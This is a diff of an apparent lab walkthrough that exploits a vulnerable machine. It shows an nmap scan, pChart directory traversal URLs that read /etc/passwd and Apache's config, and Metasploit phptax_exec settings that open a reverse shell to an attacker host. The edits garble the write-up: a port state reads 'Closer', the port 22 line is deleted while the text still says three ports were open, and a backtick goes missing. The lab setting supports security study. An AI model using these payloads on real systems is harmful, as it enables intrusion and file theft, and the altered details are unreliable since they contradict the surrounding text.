@@ -29,7 +29,7 @@ This scanned my local subnet and returned the target machine's IP address — **
 Now that I had the IP, I ran an **aggressive scan** using Nmap to identify open ports and the services running on them.
 
 ```bash
-nmap -A 192.168.1.123
+nmap -A 192.168.10.5
 ```
 
 **What is an Aggressive Scan?**
@@ -40,13 +40,12 @@ The `-A` flag enables OS detection, version detection, script scanning, and trac
 
 ```
 PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH
+22/tcp   Closer  ssh     OpenSSH
 80/tcp   open  http    Apache httpd
 8080/tcp open  http    Apache httpd
 ```
 
 Three ports were open:
-- **Port 22** — SSH
 - **Port 80** — HTTP (web server)
 - **Port 8080** — HTTP (another web instance)
 
@@ -58,7 +57,7 @@ Since HTTP is running on both ports, let's check the web pages.
 
 ### Port 80
 
-Opening `http://192.168.1.123` in the browser showed a basic default page — nothing interesting at first glance.
+Opening `http://192.168.10.5 in the browser showed a basic default page — nothing interesting at first glance.
 
 But before giving up, I always check the **page source code**. And there it was — a commented-out URL pointing to a **pChart** directory.
 
@@ -74,7 +73,7 @@ Navigating to the URL showed a PHP application file listing.
 
 ### Port 8080
 
-Opening `http://192.168.1.123:8080` returned a **403 Forbidden** error.
+Opening `http://192.168.10.5:8080` returned a **403 Forbidden** error.
 
 Interesting. Something is blocking access here. We'll come back to this.
 
@@ -96,7 +95,7 @@ The flaw in pChart allows an attacker to read sensitive files outside the web ro
 **Payload:**
 
 ```
-http://192.168.1.123/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
+http://192.168.10.5/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
 ```
 
 **URL Decoded:** `Script=../../etc/passwd`
@@ -114,7 +113,7 @@ Now I needed to understand **why port 8080 was returning 403**. The answer would
 Using the same Directory Traversal trick, I read the Apache config:
 
 ```
-http://192.168.1.123/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
+http://192.168.10.5/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
 ```
 
 Inside the config, I found this line:
@@ -154,7 +153,7 @@ Accept: text/html
 
 ```
 GET / HTTP/1.1
-Host: 192.168.1.123:8080
+Host: 192.168.10.5:8080
 User-Agent: Mozilla/4.0
 Accept: text/html
 ...
@@ -195,9 +194,9 @@ msf > use exploit/multi/http/phptax_exec
 Set the required options:
 
 ```bash
-msf > set LHOST 192.168.1.100    # Your Kali IP
-msf > set LPORT 4444
-msf > set RHOSTS 192.168.1.123   # Target IP
+msf > set LHOST 192.168.10.9   # Your Kali IP
+msf > set LPORT 8686
+msf > set RHOSTS 192.168.10.5  # Target IP
 msf > set RPORT 8080
 ```
 
